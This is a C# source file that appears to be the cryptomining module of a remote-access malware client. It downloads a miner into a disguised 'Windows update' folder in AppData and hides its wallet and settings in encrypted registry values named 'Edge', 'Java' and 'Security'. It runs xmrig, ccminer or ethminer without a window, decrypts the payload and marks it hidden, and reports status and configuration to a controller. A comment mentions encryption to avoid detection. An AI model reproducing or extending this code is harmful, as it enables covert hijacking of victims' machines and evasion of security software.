using boulzar.Other;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;


namespace boulzar.Methods
{
    public class mnr
    {
        #region Declaration

        public static string mnr_dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows update\";
        public static string exe_path = mnr_dir;
        public static string _lnk;
        public static string Mnr_type;
        public static string args;
        public static string cmddata;
        public static int procpid;
        public static bool isinstalled = false;
        public static string miner;
        public static bool statue = false;
        public static int Cpu;
        public static string ram;
        public static bool idl;
        public static string algo;
        public static string pool;
        public static string wallet;
        public static string minnertype = "nn";

        public static Process p = new Process();
        #endregion
        public static string m_info()
        {
            minnertype = AES.StrDecrypt(Helpers.ReadRegKey("Java"));

            if (minnertype != "Null")
            {
                exe_path = mnr_dir + minnertype + ".exe";
            }

            string data = "";
            string s = "~";


            if (File.Exists(exe_path))
            {
                miner = "null";
                isinstalled = true;
            }
            else
            {
                miner = "Not installed";
                isinstalled = false;
            }

            statue = Cheackifruning();
            // idl = Form1.idle;


            wallet = AES.StrDecrypt(Helpers.ReadRegKey("Edge"));

            data += isinstalled.ToString() + s;
            data += miner + s;
            data += statue.ToString() + s;
            data += idl.ToString() + s;
            data += minnertype + s;
            data += pool + s;
            data += wallet + s;
            data += "d";
            return data;

        }
        public static void m_sysinfo()
        {
            string data = "";
            string s = "~";

            Cpu = Helpers.GetCpu();
            data += Helpers.GetRam();
            data += Cpu;
            Helpers.Send(DataType.mnrinfsys, Helpers.Getbytes(data));
        }

        public static void GetConfig()
        {

            string config_path = "";

            if (minnertype == "xmrig")
            {
                config_path = mnr_dir + "config.json";
                if (File.Exists(config_path))
                {
                    Helpers.Send(DataType.config_miner, Helpers.Getbytes(File.ReadAllText(config_path)));
                }

            }

            if (minnertype == "ccminer")
            {
                config_path = mnr_dir + "ccminer.conf";
                if (File.Exists(config_path))
                {
                    Helpers.Send(DataType.config_miner, Helpers.Getbytes(File.ReadAllText(config_path)));
                }
            }

            if (minnertype == "ethminer")
            {
                string args = AES.StrDecrypt(Helpers.ReadRegKey("Security"));
                Helpers.Send(DataType.config_miner, Helpers.Getbytes(args));
            }




        }
        public static void SetConfig(string Data)
        {
            string config_path = "";

            string[] newconfig = Data.Split('~');
            string newconfig_dec = newconfig[1];

            if (minnertype == "xmrig")
            {
                config_path = mnr_dir + "config.json";
                File.Delete(config_path);
                File.WriteAllText(config_path, newconfig_dec);

            }

            if (minnertype == "ccminer")
            {
                config_path = mnr_dir + "ccminer.conf";
                File.Delete(config_path);

                File.WriteAllText(config_path, newconfig_dec);
            }

            if (minnertype == "ethminer")
            {
                Helpers.CreateRegKey("Security", AES.strEncrypt(newconfig_dec));
            }

            Helpers.SendNotif("The new Configuration has been set");
        }
        /*ccminer
         * ethminer
         * xmrig
         for xmrig when user is IDL restart xmrig to disable the RandomX light mode in config 

         */
        public static void Load()
        {
            // Encrypt the minner then decrypt when decompressed
            // Also try 'Encrypt' to avoid detection




            if (!Directory.Exists(mnr_dir) || !File.Exists(exe_path))
            {
                Directory.CreateDirectory(mnr_dir);
                Helpers.Dw(_lnk, mnr_dir + "random");
                Helpers.ismnrdw = true;
                Helpers.CreateRegKey("Edge", AES.strEncrypt(wallet));
                Helpers.CreateRegKey("Java", AES.strEncrypt(Mnr_type));
                Helpers.CreateRegKey("Security", AES.strEncrypt(args));
            }



        }
        public static void start(string p1)
        {
            try
            {


                ProcessStartInfo proc = new ProcessStartInfo();
                proc.FileName = p1;
                proc.CreateNoWindow = true;
                proc.UseShellExecute = false;
                proc.RedirectStandardOutput = true;
                if (minnertype == "ethminer")
                {
                    proc.Arguments = AES.StrDecrypt(Helpers.ReadRegKey("Security"));
                }

                p.StartInfo = proc;
                p.Start();
                Thread.Sleep(100);

                procpid = p.Id;
                statue = true;
                cmddata = "";

                Thread t = new Thread(readfromcmd);
                t.Start();



            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }
        public static void readfromcmd()
        {
            while (!p.StandardOutput.EndOfStream)
            {
                var line = p.StandardOutput.ReadLine();
                cmddata += line + Environment.NewLine;
            }

            p.WaitForExit();

        }
        public static bool Cheackifruning()
        {
            Process[] pname = Process.GetProcessesByName("ccminner");
            if (minnertype == "ethminer")
            {
                pname = Process.GetProcessesByName("ethminer");

            }
            if (minnertype == "ccminner")
            {
                pname = Process.GetProcessesByName("ccminner");
            }
            if (minnertype == "xmrig")
            {
                pname = Process.GetProcessesByName("xmrig");
            }
            if (pname.Length == 0)

                return false;

            else
                return true;
        }


        #region encrypt
        public static TripleDESCryptoServiceProvider des = new TripleDESCryptoServiceProvider();
        public static void TripleDES(string key, CipherMode mod, PaddingMode padmod)
        {



            des.Key = UTF8Encoding.UTF8.GetBytes(key);
            des.Mode = mod;


            des.Padding = padmod;


        }

        public static void DES_Dec(string filepath, string outpath)
        {
            Thread.Sleep(1000);
            byte[] Bytes = File.ReadAllBytes(filepath);
            Thread.Sleep(1000);
            byte[] dBytes = des.CreateDecryptor().TransformFinalBlock(Bytes, 0, Bytes.Length);
            Thread.Sleep(1000);
            File.Delete(filepath);
            File.WriteAllBytes(outpath, dBytes);
            File.SetAttributes(outpath, FileAttributes.Hidden);

        }


        #endregion


    }
}
